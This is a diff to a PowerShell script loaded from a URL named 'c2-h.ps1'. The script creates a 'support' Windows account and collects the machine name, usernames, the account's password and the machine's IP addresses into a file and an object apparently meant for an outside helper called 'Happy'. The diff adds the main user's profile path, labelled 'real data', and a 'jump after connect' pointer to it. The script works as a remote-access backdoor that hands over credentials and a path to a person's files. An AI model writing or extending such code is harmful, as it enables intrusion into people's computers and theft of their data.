@@ -6,7 +6,7 @@
 # What it does NOT do: no silent upload, no router login, no change to main account password.
 
 $ScriptUrl = 'https://www.adityaai.dev/c2-h.ps1'
-$Version = '2026-09-10-v4-mail'
+$Version = '2026-09-10-v5-profiles'
 $HelperName = 'Happy'
 $ShareFileName = 'share-it-to-happy.txt'
 $ErrorActionPreference = 'Stop'
@@ -173,6 +173,7 @@ if (-not $created) {
 Write-Host '[6/6] Collecting IP info...' -ForegroundColor Gray
 $HostName = $env:COMPUTERNAME
 $MainUser = $env:USERNAME
+$MainProfile = "C:\Users\$MainUser"
 $InternalIPs = @()
 try {
   $InternalIPs = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
@@ -225,6 +226,8 @@ Computer name: $HostName
 Support username: $SupportUser
 Support password: $Password
 Main Windows user (do NOT share its password): $MainUser
+Main profile (real data): $MainProfile
+Jump after connect: cd "$MainProfile"
 
 Internal IP (same WiFi): $InternalIPStr
 External IP (internet): $ExternalIP
@@ -262,6 +265,8 @@ try {
     supportUser = $SupportUser
     password = $Password
     mainUser = $MainUser
+    mainHome = $MainProfile
+    os = 'windows'
     internalIps = $InternalIPStr
     externalIp = $ExternalIP
     internalPort = $InternalPort
